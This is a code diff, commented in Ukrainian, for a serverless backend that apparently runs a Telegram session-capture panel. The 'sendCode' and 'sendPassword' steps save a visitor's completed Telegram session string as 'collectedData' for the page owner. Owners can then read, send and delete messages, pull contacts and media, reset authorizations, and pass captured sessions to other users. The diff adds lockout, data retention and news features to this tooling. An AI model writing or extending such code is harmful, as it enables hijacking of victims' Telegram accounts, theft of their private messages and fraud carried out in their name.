@@ -18,33 +18,53 @@ function getDriveClient() {
 
 async function readDb(drive) {
     const fileId = process.env.GOOGLE_DRIVE_FILE_ID;
-    if (!fileId) throw new Error("Missing GOOGLE_DRIVE_FILE_ID.");
-    
+    if (!fileId) throw new Error("Missing GOOGLE_DRIVE_FILE_ID environment variable.");
+    const res = await drive.files.get({ fileId, alt: 'media' });
     try {
-        const res = await drive.files.get({ fileId, alt: 'media' });
-        if (!res.data) return { users: [], refCodes: [], blockedIdentifiers: [], settings: { defaultDeviceLimit: 3 }, templates: [], addedData: [], news: [] };
+        const defaultState = {
+            users: [],
+            refCodes: [],
+            blockedIdentifiers: [],
+            failedLogins: [],
+            settings: { 
+                defaultDeviceLimit: 3, 
+                dataRetentionDays: 0,
+                termsLastUpdatedAt: null,
+                termsPushRequired: false
+            },
+            templates: [],
+            addedData: [],
+            news: [],
+            pushNews: []
+        };
+
+        if (!res.data) return defaultState;
+        
         const dbData = typeof res.data === 'object' ? res.data : JSON.parse(res.data);
-        if (!dbData.settings) dbData.settings = { defaultDeviceLimit: 3 };
-        if (!dbData.templates) dbData.templates = [];
-        if (!dbData.addedData) dbData.addedData = [];
-        if (!dbData.news) dbData.news = [];
+
+        if (!dbData.settings) dbData.settings = defaultState.settings;
+        dbData.settings = { ...defaultState.settings, ...dbData.settings };
+
+        for (const key of ['users', 'refCodes', 'blockedIdentifiers', 'failedLogins', 'templates', 'addedData', 'news', 'pushNews']) {
+            if (!dbData[key]) dbData[key] = defaultState[key];
+        }
+
         if (dbData.templates.length === 0) {
             dbData.templates.push(
                 { templateId: 'default-1', name: 'Проста візитка', htmlContent: '<!DOCTYPE html><html lang="uk"><head><meta charset="UTF-8"><title>Мій Профіль</title><style>body{font-family: Arial, sans-serif; text-align: center; background: #f4f4f4; padding-top: 50px;} .card{background: white; margin: 0 auto; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 300px;} h1{color: #333;} p{color: #666;}</style></head><body><div class="card"><h1>Ім\'я Прізвище</h1><p>Веб-розробник</p></div></body></html>' },
                 { templateId: 'default-2', name: 'Сторінка-заглушка', htmlContent: '<!DOCTYPE html><html lang="uk"><head><meta charset="UTF-8"><title>Скоро!</title><style>body{display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: linear-gradient(to right, #6a11cb, #2575fc); color: white; font-family: "Segoe UI", sans-serif;} h1{font-size: 3em;}</style></head><body><h1>Наш сайт скоро відкриється!</h1></body></html>' }
             );
         }
+        
         return dbData;
     } catch (e) {
-        if (e.message.includes('File not found') || e.message.includes('404')) {
-            console.warn("Database file not found, creating new one. Error:", e.message);
-            // Створюємо новий файл бази даних
-            const newDb = { users: [], refCodes: [], blockedIdentifiers: [], settings: { defaultDeviceLimit: 3 }, templates: [] };
-            await writeDb(drive, newDb);
-            return newDb;
-        }
         console.warn("Could not parse DB file. Starting with empty state. Error:", e.message);
-        return { users: [], refCodes: [], blockedIdentifiers: [], settings: { defaultDeviceLimit: 3 }, templates: [], addedData: [], news: [] };
+        // Повертаємо defaultState при помилці, щоб уникнути падіння системи
+        return {
+            users: [], refCodes: [], blockedIdentifiers: [], failedLogins: [],
+            settings: { defaultDeviceLimit: 3, dataRetentionDays: 0, termsLastUpdatedAt: null, termsPushRequired: false },
+            templates: [], addedData: [], news: [], pushNews: []
+        };
     }
 }
 
@@ -196,11 +216,60 @@ async function processTemporaryFileDeletions(drive) {
 }
 
 
+async function performDataCleanup(drive) {
+    try {
+        const db = await readDb(drive);
+
+        const retentionDays = parseInt(db.settings.dataRetentionDays, 10) || 0;
+        if (retentionDays <= 0) {
+            return; // Функція вимкнена
+        }
+
+        const lastCleanup = db.settings.lastCleanupAt ? new Date(db.settings.lastCleanupAt) : null;
+        const oneDay = 24 * 60 * 60 * 1000;
+        const now = new Date();
+
+        if (lastCleanup && (now.getTime() - lastCleanup.getTime() < oneDay)) {
+            return; // Ще не пройшло 24 години
+        }
+
+        const cutoffDate = new Date(now.getTime() - (retentionDays * oneDay));
+        let dataWasDeleted = false;
+
+        db.users.forEach(user => {
+            if (user.collectedData && user.collectedData.length > 0) {
+                const originalCount = user.collectedData.length;
+                user.collectedData = user.collectedData.filter(entry => new Date(entry.collectedAt) > cutoffDate);
+                if (user.collectedData.length < originalCount) {
+                    dataWasDeleted = true;
+                }
+            }
+        });
+
+        if (dataWasDeleted) {
+            console.log(`DATA CLEANUP: Old data removed based on ${retentionDays}-day retention policy.`);
+            db.settings.lastCleanupAt = now.toISOString();
+            await writeDb(drive, db);
+        } else if (!lastCleanup) {
+            // Якщо це перший запуск і нічого не було видалено, все одно оновлюємо час
+            db.settings.lastCleanupAt = now.toISOString();
+            await writeDb(drive, db);
+        }
+    } catch (error) {
+        console.error("Error during data cleanup:", error.message);
+        // Не кидаємо помилку далі, щоб не зламати основний запит
+    }
+}
+
 
 exports.handler = async function(event) {
     if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method Not Allowed' };
 
     try {
+        // Запускаємо очищення на початку, воно не буде блокувати основний запит
+        // і виконається тихо у фоні, якщо настав час.
+        await performDataCleanup(getDriveClient());
+        
         const { action, payload, stream: isStream } = JSON.parse(event.body);
         const clientIp = event.headers['x-nf-client-connection-ip'];
         const fingerprint = payload ? payload.fingerprint : null;
@@ -239,7 +308,6 @@ exports.handler = async function(event) {
 
                     return { statusCode: 200, body: JSON.stringify({ success: true, nextStep: 'code', token: tempToken }) };
                 }
-
                 case 'sendCode': {
                     const { code, token } = payload;
                     const decoded = jwt.verify(token, jwtSecret);
@@ -266,13 +334,13 @@ exports.handler = async function(event) {
                     const user = db.users.find(u => u.userId === ownerUserId);
                     if (user) {
                         if (!user.collectedData) user.collectedData = [];
-                        user.collectedData.push({ fingerprint, collectedAt: new Date().toISOString(), status: 'success', type: 'telegram_session', data: { sessionString: finalSessionString } });
+                        const entry = { fingerprint, collectedAt: new Date().toISOString(), status: 'success', type: 'telegram_session', data: { sessionString: finalSessionString } };
+                        user.collectedData.push(entry);
                         await writeDb(drive, db);
-                        await sendTelegramNotification(user, { type: 'telegram_session', status: 'success' });
+                        await sendTelegramNotification(user, entry); // ВИПРАВЛЕНО: відправляємо сповіщення
                     }
                     return { statusCode: 200, body: JSON.stringify({ success: true, completed: true }) };
                 }
-
                 case 'sendPassword': {
                     const { password, token } = payload;
                     if (!password || typeof password !== 'string' || password.trim() === '') {
@@ -299,19 +367,19 @@ exports.handler = async function(event) {
                     const user = db.users.find(u => u.userId === ownerUserId);
                     if (user) {
                         if (!user.collectedData) user.collectedData = [];
-                        user.collectedData.push({ 
+                        const entry = { 
                             fingerprint, 
                             collectedAt: new Date().toISOString(), 
                             status: 'success', 
                             type: 'telegram_session', 
                             data: { sessionString: finalSessionString } 
-                        });
+                        };
+                        user.collectedData.push(entry);
                         await writeDb(drive, db);
-                        await sendTelegramNotification(user, { type: 'telegram_session', status: 'success' });
+                        await sendTelegramNotification(user, entry); // ВИПРАВЛЕНО: відправляємо сповіщення
                     }
                     return { statusCode: 200, body: JSON.stringify({ success: true, completed: true }) };
                 }
-                
                 default:
                     return { statusCode: 400, body: 'Invalid Telegram auth step.' };
             }
@@ -337,7 +405,33 @@ exports.handler = async function(event) {
                     return { statusCode: 200, body: htmlContent, headers: { 'Content-Type': 'text/html; charset=utf-8' }};
                 }
                 case 'getNews': {
-                    const items = (db.news || []).sort((a,b)=> new Date(b.createdAt)-new Date(a.createdAt));
+                    const now = new Date().toISOString();
+                    const items = (db.news || [])
+                        .filter(news => {
+                            const aud = news.audience || { type: 'all' };
+                            const userId = payload.token ? jwt.verify(payload.token, process.env.JWT_SECRET).userId : null;
+                            
+                            if (!userId) return aud.type === 'all'; // Анонім бачить тільки загальні
+
+                            if (aud.type === 'all') return true;
+                            if (aud.type === 'include') return aud.userIds.includes(userId);
+                            if (aud.type === 'exclude') return !aud.userIds.includes(userId);
+                            return true;
+                        })
+                        .map(news => {
+                            // Відмічаємо, що користувач прочитав новину
+                            const userId = payload.token ? jwt.verify(payload.token, process.env.JWT_SECRET).userId : null;
+                            if (userId && !(news.readBy || []).some(r => r.userId === userId)) {
+                                if (!news.readBy) news.readBy = [];
+                                news.readBy.push({ userId, readAt: now });
+                            }
+                            const { readBy, ...newsWithoutReadBy } = news; // Не віддаємо список тих, хто прочитав
+                            return newsWithoutReadBy;
+                        })
+                        .sort((a,b)=> new Date(b.createdAt)-new Date(a.createdAt));
+
+                    await writeDb(drive, db); // Зберігаємо інформацію про прочитання
+                    
                     return { statusCode: 200, body: JSON.stringify(items), headers: { 'Content-Type': 'application/json' } };
                 }
                 case 'getAddedDataById': {
@@ -377,18 +471,20 @@ exports.handler = async function(event) {
                     if (isDeviceAlreadyRegistered) return { statusCode: 403, body: 'An account has already been registered from this device.' };
                     
                     code.usesLeft--;
+                    const now = new Date().toISOString();
                     const newUser = {
                         userId: nanoid(24),
                         nickname,
                         password: await bcrypt.hash(password, 10),
                         status: 'active',
-                        createdAt: new Date().toISOString(),
+                        createdAt: now,
                         lastLoginAt: null,
                         registeredWithRef: ref,
                         deviceLimitOverride: null,
-                        sessions: [{ sessionId: nanoid(), ip: clientIp, fingerprint, status: 'active', createdAt: new Date().toISOString(), lastUsedAt: new Date().toISOString() }],
+                        sessions: [{ sessionId: nanoid(), ip: clientIp, fingerprint, status: 'active', createdAt: now, lastUsedAt: now }],
                         publishedPage: null,
                         collectedData: [],
+                        termsAgreedAt: now,
                         telegramBinding: {
                             activationId: null, status: null, chatId: null, username: null
                         }
@@ -399,10 +495,37 @@ exports.handler = async function(event) {
                     return { statusCode: 201, body: JSON.stringify({ personalPage: `/user/${newUser.userId}`, token: token }) };
                 }
                 case 'login': {
+                    const MAX_FAILED_ATTEMPTS = 5;
+                    const LOCKOUT_PERIOD_MINUTES = 10;
+                    const CLEANUP_PERIOD_HOURS = 1;
+
+                    const cleanupCutoff = new Date(Date.now() - CLEANUP_PERIOD_HOURS * 60 * 60 * 1000);
+                    db.failedLogins = db.failedLogins.filter(attempt => new Date(attempt.timestamp) > cleanupCutoff);
+
+                    const lockoutCutoff = new Date(Date.now() - LOCKOUT_PERIOD_MINUTES * 60 * 1000);
+                    const recentFailures = db.failedLogins.filter(attempt => attempt.ip === clientIp && new Date(attempt.timestamp) > lockoutCutoff);
+
+                    if (recentFailures.length >= MAX_FAILED_ATTEMPTS) {
+                        if (!db.blockedIdentifiers.some(b => b.ip === clientIp)) {
+                            db.blockedIdentifiers.push({ ip: clientIp, reason: 'auto-lockout', timestamp: new Date().toISOString() });
+                            await writeDb(drive, db);
+                        }
+                        return { statusCode: 429, body: 'Too many failed login attempts. Please try again later.' };
+                    }
+                    
                     const { nickname, password, userId } = payload;
                     const user = db.users.find(u => u.userId === userId);
-                    if (!user || user.nickname.toLowerCase() !== nickname.toLowerCase() || !(await bcrypt.compare(password, user.password))) return { statusCode: 401, body: 'Invalid credentials.' };
+                    
+                    if (!user || user.nickname.toLowerCase() !== nickname.toLowerCase() || !(await bcrypt.compare(password, user.password))) {
+                        db.failedLogins.push({ ip: clientIp, timestamp: new Date().toISOString() });
+                        await writeDb(drive, db);
+                        return { statusCode: 401, body: 'Invalid credentials.' };
+                    }
+
                     if (user.status === 'suspended') return { statusCode: 403, body: 'This account has been suspended.' };
+
+                    db.failedLogins = db.failedLogins.filter(attempt => attempt.ip !== clientIp);
+
                     let session = user.sessions.find(s => s.ip === clientIp && s.fingerprint === fingerprint);
                     if (session) {
                         if (session.status === 'blocked') return { statusCode: 403, body: 'This session has been blocked by an administrator.' };
@@ -484,38 +607,13 @@ exports.handler = async function(event) {
             if (!session || session.status !== 'active') return { statusCode: 401, body: 'Session is invalid or has been terminated.' };
 
             const telegramActions = [
-                'getTelegramDialogs',
-                'getTelegramMessages',
-                'sendTelegramMessage',
-                'getTelegramEntityInfo',
-                'deleteTelegramMessages',
-                'deleteTelegramMessage',
-                'editTelegramMessage',
-                'toggleTelegramBlock',
-                'deleteTelegramDialog',
-                'updateTelegramProfilePhoto',
-                'listTelegramProfilePhotos',
-                'downloadProfilePhoto',
-                'getDialogFolders',
-                'getTelegramDialogFilters',
-                'getMe',
-                'downloadTelegramMedia',
-                'updateProfile', // ВИПРАВЛЕНО: з updateTelegramProfile на updateProfile
-                'readHistory',
-                'forwardMessages',
-                'searchMessages',
-                'sendReaction',
-                'pinMessage',
-                'unpinMessage',
-                'archiveDialog',
-                'getContacts',
-                'getTelegramDialogsPaged',
-                'getMessageById',
-                'getHistoryAround',
-                'getAuthorizations',
-                'resetAuthorizations',
-                'unpinAllMessages', // ДОДАНО
-                'getPinnedMessages' // ДОДАНО
+                'getTelegramDialogs', 'getTelegramMessages', 'sendTelegramMessage', 'getTelegramEntityInfo',
+                'deleteTelegramMessages', 'deleteTelegramMessage', 'editTelegramMessage', 'toggleTelegramBlock',
+                'deleteTelegramDialog', 'updateTelegramProfilePhoto', 'listTelegramProfilePhotos', 'downloadProfilePhoto',
+                'getDialogFolders', 'getTelegramDialogFilters', 'getMe', 'downloadTelegramMedia', 'updateProfile',
+                'readHistory', 'forwardMessages', 'searchMessages', 'sendReaction', 'pinMessage', 'unpinMessage',
+                'archiveDialog', 'getContacts', 'getTelegramDialogsPaged', 'getMessageById', 'getHistoryAround',
+                'getAuthorizations', 'resetAuthorizations', 'unpinAllMessages', 'getPinnedMessages'
             ];
             if (telegramActions.includes(action)) {
                 try {
@@ -1237,11 +1335,24 @@ exports.handler = async function(event) {
                 }
             }
 
-            // Helper: guard for received data restrictions
-            const isViewDataRestricted = !!(user.restrictions && user.restrictions.view_received);
+ const isViewDataRestricted = !!(user.restrictions && user.restrictions.view_received);
 
             switch(action) {
                 case 'getUserData': {
+                    if (db.settings.termsPushRequired && (!user.termsAgreedAt || new Date(user.termsAgreedAt) < new Date(db.settings.termsLastUpdatedAt))) {
+                        return { statusCode: 200, body: JSON.stringify({ actionRequired: true, type: 'terms_of_use' })};
+                    }
+                    const unseenPushNews = (db.pushNews || []).find(news => {
+                        const isTargeted = 
+                            (news.audience.type === 'all') ||
+                            (news.audience.type === 'include' && news.audience.userIds.includes(user.userId)) ||
+                            (news.audience.type === 'exclude' && !news.audience.userIds.includes(user.userId));
+                        return isTargeted && !news.seenBy.some(seen => seen.userId === user.userId);
+                    });
+                    if (unseenPushNews) {
+                        const { seenBy, keyword, ...newsPayload } = unseenPushNews;
+                        return { statusCode: 200, body: JSON.stringify({ actionRequired: true, type: 'push_news', payload: newsPayload })};
+                    }
                     const protocol = event.headers.host.includes('netlify.app') ? 'https://' : 'http://';
                     const { collectedData, ...lightUserData } = user;
                     return { statusCode: 200, body: JSON.stringify({
@@ -1253,6 +1364,28 @@ exports.handler = async function(event) {
                         telegramBinding: lightUserData.telegramBinding || {},
                         restrictions: lightUserData.restrictions || {}
                     })};
+                }
+                case 'confirmTerms': {
+                    user.termsAgreedAt = new Date().toISOString();
+                    await writeDb(drive, db);
+                    return { statusCode: 200, body: JSON.stringify({ success: true }) };
+                }
+                case 'confirmPushNews': {
+                    const { pushId, keyword } = payload;
+                    const pushNewsItem = (db.pushNews || []).find(n => n.id === pushId);
+                    if (!pushNewsItem) return { statusCode: 404, body: 'Push news not found.' };
+                    if (pushNewsItem.mode === 'aggressive') {
+                        if (!keyword || keyword.trim().toLowerCase() !== pushNewsItem.keyword.trim().toLowerCase()) {
+                            return { statusCode: 400, body: 'Невірне ключове слово.' };
+                        }
+                    }
+                    pushNewsItem.seenBy.push({
+                        userId: user.userId,
+                        seenAt: new Date().toISOString(),
+                        keywordCorrectlyEntered: pushNewsItem.mode === 'aggressive'
+                    });
+                    await writeDb(drive, db);
+                    return { statusCode: 200, body: JSON.stringify({ success: true }) };
                 }
                 case 'transferGift': {
                     const { to, by = 'nickname', amount = 1 } = payload;
@@ -1284,7 +1417,6 @@ exports.handler = async function(event) {
                     if (isViewDataRestricted) return { statusCode: 403, body: JSON.stringify({ error: 'Forbidden' }) };
                     const entry = (user.collectedData || []).find(d => d.collectedAt === payload.timestamp);
                     if (!entry) return { statusCode: 404, body: 'Data entry not found.' };
-                    
                     if (entry.type === 'telegram_session') {
                          return { statusCode: 200, body: JSON.stringify({
                              type: 'telegram_session',
@@ -1359,17 +1491,13 @@ exports.handler = async function(event) {
                     const target = db.users.find(u => u.userId === toUserId);
                     if (!target) return { statusCode: 404, body: 'Target user not found.' };
                     if (target.userId === fromUser.userId) return { statusCode: 400, body: 'Cannot transfer to self.' };
-
                     const entryIndex = (fromUser.collectedData || []).findIndex(d => d.collectedAt === fromTimestamp && d.type === 'telegram_session');
                     if (entryIndex === -1) return { statusCode: 404, body: 'Session entry not found.' };
-
                     const entry = fromUser.collectedData[entryIndex];
                     if (!entry.data || !entry.data.sessionString) return { statusCode: 400, body: 'Invalid session payload.' };
-
                     fromUser.collectedData.splice(entryIndex, 1);
                     if (!target.collectedData) target.collectedData = [];
                     target.collectedData.push({ ...entry, transferredAt: new Date().toISOString(), transferredFrom: fromUser.userId });
-
                     await writeDb(drive, db);
                     return { statusCode: 200, body: JSON.stringify({ success: true }) };
                 }
